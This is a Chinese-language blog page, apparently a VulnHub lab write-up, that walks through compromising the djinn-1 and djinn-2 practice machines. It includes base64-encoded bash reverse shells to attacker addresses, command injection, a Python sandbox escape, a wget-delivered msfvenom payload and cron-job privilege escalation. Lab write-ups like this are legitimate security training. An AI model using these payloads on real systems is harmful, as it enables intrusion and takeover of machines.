@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>vulnhub——djinn系列 | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search')
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+        } else {
+            search.removeClass("mobile-search");
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data, index) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">vulnhub——djinn系列</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 20, 2020&nbsp;&nbsp;23:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/vulnhub/">vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="djinn-1"><a href="#djinn-1" class="headerlink" title="djinn-1"></a>djinn-1</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030193852.png" alt=""></p>
+<p>22端口服务虽然开着，但处于tcpwrapped状态，即非白名单主机无法连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200601.png" alt=""></p>
+<p>7331有个静态页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200751.png" alt=""></p>
+<p>扫描目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031145127.png" alt=""></p>
+<h3 id="ftp登录"><a href="#ftp登录" class="headerlink" title="ftp登录"></a>ftp登录</h3><p>有ftp端口，hydra爆破试下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030195346.png" alt=""></p>
+<p>ftp用户好像随便登录。。。登上去看看目录下有三个文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030195444.png" alt=""></p>
+<p>下载下来看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200017.png" alt=""></p>
+<p>cred.txt得知存在nitu用户</p>
+<p>game.txt说1337端口有个游戏，直接访问不到，nc成功连接是个计算的小游戏</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200201.png" alt=""></p>
+<p>message.txt是个留言</p>
+<h3 id="端口敲门"><a href="#端口敲门" class="headerlink" title="端口敲门"></a>端口敲门</h3><p>game.txt提示回答一千次答案就有礼物，那么利用pwntools写个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(raw1,raw2,raw3)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'+'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3+raw1)</span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'-'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3-raw1)</span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3*raw1)</span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'/'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3/raw1)</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">'192.168.119.136'</span>,<span class="string">'1337'</span>)</span><br><span class="line">res = s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()</span><br><span class="line">res2 = str(res,encoding=<span class="string">'UTF-8'</span>)</span><br><span class="line">res3 = list(res2)</span><br><span class="line">raw1 = int(res3[<span class="number">-3</span>])</span><br><span class="line">raw2 = res3[<span class="number">-7</span>]</span><br><span class="line">raw3 = int(res3[<span class="number">-11</span>])</span><br><span class="line">re = result(raw1,raw2,raw3)</span><br><span class="line">print(raw1,raw2,raw3)</span><br><span class="line">print(re)</span><br><span class="line">s.sendline(str(re))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'第'</span>+str(i)+<span class="string">'次'</span>)</span><br><span class="line">    <span class="keyword">if</span> i&gt;<span class="number">1000</span>:</span><br><span class="line">        print(s.recvline()+s.recvline()+s.recvline())</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    res4=s.recvline()</span><br><span class="line">    print(res4)</span><br><span class="line">    res5 = str(res4,encoding=<span class="string">'UTF-8'</span>)</span><br><span class="line">    res6 = list(res5)</span><br><span class="line">    raw4 = int(res6[<span class="number">-3</span>])</span><br><span class="line">    raw5 = res6[<span class="number">-7</span>]</span><br><span class="line">    raw6 = int(res6[<span class="number">-11</span>])</span><br><span class="line">    re2 = result(raw4,raw5,raw6)</span><br><span class="line">    print(re2)</span><br><span class="line">    s.sendline(str(re2))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031155255.png" alt=""></p>
+<p>给了三个数字，猜测可能是三个端口号，想起了之前的端口敲门服务，试一下</p>
+<p>现在的ssh是不可访问的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031155434.png" alt=""></p>
+<p>依次‘敲’1356，6784，3409，可能失败，多敲几次就开了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031161505.png" alt=""></p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>现在只知道有个nitu用户，但没有密码无法登录，继续看另一条线，之前扫目录得到的wish</p>
+<p>访问有个命令框，扫出个命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031162815.png" alt=""></p>
+<p>测试一下，输入ls，跟随跳转是可以看到回显的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031163739.png" alt=""></p>
+<p>那么试试nc连接shell</p>
+<p>显示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031163934.png" alt=""></p>
+<p>bash同样回显，可能过滤了/bin/sh字符</p>
+<p>那么把payload base64转换处理试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031171146.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExOS4xMjgvOTk5OSAwPiYxCg&#x3D;&#x3D;&quot; | base64 -d | bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031171128.png" alt=""></p>
+<p>在.dev目录下找到nitish用户的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031185747.png" alt=""></p>
+<p>sudo -l得知genie命令免密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031190010.png" alt=""></p>
+<h3 id="python沙箱逃逸提权"><a href="#python沙箱逃逸提权" class="headerlink" title="python沙箱逃逸提权"></a>python沙箱逃逸提权</h3><p>查看帮助</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192239.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192837.png" alt=""></p>
+<p>有两个貌似可以执行命令的参数，试一下</p>
+<p>直接进来了。。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192949.png" alt=""></p>
+<p>继续</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031193228.png" alt=""></p>
+<p>又是个奇怪的游戏</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031193643.png" alt=""></p>
+<p>退出的时候看着像python，试试沙箱逃逸</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101222613.png" alt=""></p>
+<p>那么直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101224321.png" alt=""></p>
+<p>root目录下通关信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101224718.png" alt=""></p>
+<h2 id="djinn-2"><a href="#djinn-2" class="headerlink" title="djinn-2"></a>djinn-2</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111084118.png" alt=""></p>
+<p>ftp可以匿名登录，查看目录下还是有三个文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111084611.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111084636.png" alt=""></p>
+<p>nitu用户仍然存在，并且说时解雇了sam并且雇佣了一个新的成员ugtan</p>
+<p>1337端口nc连接又是一个小游戏，但这里回答两次就给一句名人名言</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111214525.png" alt=""></p>
+<p>5000端口服务不接受get请求，但post上去显示访问拒绝<img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111085759.png" alt=""></p>
+<p>7331端口依旧是静态界面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111085859.png" alt=""></p>
+<p>扫目录结果如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111090608.png" alt=""></p>
+<p>robots.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111090710.png" alt=""></p>
+<p>source文件下载打开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line">import requests</span><br><span class="line">URL &#x3D; &quot;http:&#x2F;&#x2F;&#123;&#125;:5000&#x2F;?username&#x3D;&#123;&#125;&amp;password&#x3D;&#123;&#125;&quot;</span><br><span class="line">def check_ip(ip: str):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Check whether the input IP is valid or not</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if re.match(r&#39;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#39;</span><br><span class="line">                &#39;(\.(?!$)|$))&#123;4&#125;$&#39;, ip):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">def catcher(host, username, password):</span><br><span class="line">    try:</span><br><span class="line">        url &#x3D; URL.format(host, username, password)</span><br><span class="line">        requests.post(url)</span><br><span class="line">        sleep(3)</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    print(&quot;Unable to connect to the server!!&quot;)</span><br><span class="line">def main():</span><br><span class="line">    print(&quot;If you have this then congratulations on being a part of an awesome organization&quot;)</span><br><span class="line">    print(&quot;This key will help you in connecting to our system securely.&quot;)</span><br><span class="line">    print(&quot;If you find any issue please report it to ugtan@djinn.io&quot;)</span><br><span class="line">    ip &#x3D; input(&#39;\nIP of the machine: &#39;)</span><br><span class="line">    username &#x3D; input(&#39;Your username: &#39;)</span><br><span class="line">    password &#x3D; input(&#39;Your password: &#39;)</span><br><span class="line">    if ip and check_ip(ip) and username &#x3D;&#x3D; &quot;REDACTED&quot; and password &#x3D;&#x3D; &quot;REDACTED&quot;:</span><br><span class="line">        print(&quot;Verifiying %s with host %s &quot; % (username, ip))</span><br><span class="line">        catcher(ip, username, password)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Invalid IP address given&quot;)</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>发现是5000端口服务的登录方式，这时xray也扫到了5000端口登录的命令注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111092456.png" alt=""></p>
+<p>但依旧是过滤了bash和nc等等，之前的base64方式也用不了了</p>
+<p>wish目录下仍然是个对话框，但就像他说的，命令注入已经修复</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111211645.png" alt=""></p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>感觉突破口就只剩下5000端口的rce了，之前已经测试发现过滤了很多东西，查看下具体</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113163614.png" alt=""></p>
+<p>直接弹不了shell，但这里注意到靶机的wget是可以用的，那么我们可以利用生成后门，远程下载之后在靶机上执行</p>
+<p>msfvenom生成linux可执行文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113170317.png" alt=""></p>
+<p>本地python启一个http服务，靶机上wget下载到tmp目录，<code>chmod 777 /tmp/hack.elf</code>赋予执行权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113170436.png" alt=""></p>
+<p>本地msf准备监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113170539.png" alt=""></p>
+<p>执行exploit，burp执行<code>/tmp/hack.elf</code></p>
+<p>可以看到已经成功得到session</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113171056.png" alt=""></p>
+<p>python用不了直接nc或者bash弹出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113171353.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113171427.png" alt=""></p>
+<p>backups目录下除了一堆备份文件还找到一个kdbx文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113183429.png" alt=""></p>
+<p>baidu一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113183618.png" alt=""></p>
+<p>说是可以用keepass打开，nc把文件传出来，windows下keepass下打开看看</p>
+<p>但是需要一个密码才能打开这个文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113184234.png" alt=""></p>
+<p>正好之前的creds.txt里有一串字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113184317.png" alt=""></p>
+<p>输进去看看，成功，点击general，右键复制密码成功得到nitish用户的密码<code>&amp;HtMGd$LJB</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113184444.png" alt=""></p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>那么切换nitu用户，但权限不足无法直接切换，ssh连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113185205.png" alt=""></p>
+<p>一番寻找无果，查看端口进程发现2843端口一直在监听本地地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113185913.png" alt=""></p>
+<p>有一些功能</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190209.png" alt=""></p>
+<p>1，3展示，2没权限，4原样输入和展示，5可以添加给6查看</p>
+<p>但第6个选项注意到它在读取之前是会进行一项cat操作的，并且对象是通过5添加的文件名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190355.png" alt=""></p>
+<p>我们添加一个etc/passwd试试</p>
+<p>成功读取</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190836.png" alt=""></p>
+<p>因此我们知道这里存在一个命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190947.png" alt=""></p>
+<p>那么试着反弹shell</p>
+<p>bash和nc都失败</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191217.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191237.png" alt=""></p>
+<p>base64成功反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExOC4xMDgvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191912.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191940.png" alt=""></p>
+<h3 id="cronjob提权"><a href="#cronjob提权" class="headerlink" title="cronjob提权"></a>cronjob提权</h3><p>/var/mail目录下有封邮件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113192531.png" alt=""></p>
+<p>告诉说他已经在家目录里面创建好了目录，应该是这</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113193852.png" alt=""></p>
+<p>说你可以创建一个clean.sh并且cronjob会自动提交任务执行，那么写入bash，监听端口等待执行即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113194332.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113194600.png" alt=""></p>
+<p>成功获取root权限，完成</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113194742.png" alt=""></p>
+<h2 id="djinn-3"><a href="#djinn-3" class="headerlink" title="djinn-3"></a>djinn-3</h2><h3 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>端口开放及服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-11-18 05:50 EST</span><br><span class="line">Nmap scan report for 192.168.117.40</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22&#x2F;tcp    open  ssh</span><br><span class="line">80&#x2F;tcp    open  http</span><br><span class="line">5000&#x2F;tcp  open  upnp</span><br><span class="line">31337&#x2F;tcp open  Elite</span><br><span class="line">MAC Address: 00:0C:29:66:A8:11 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.62 seconds</span><br></pre></td></tr></table></figure>
+
+<p>80端口</p>
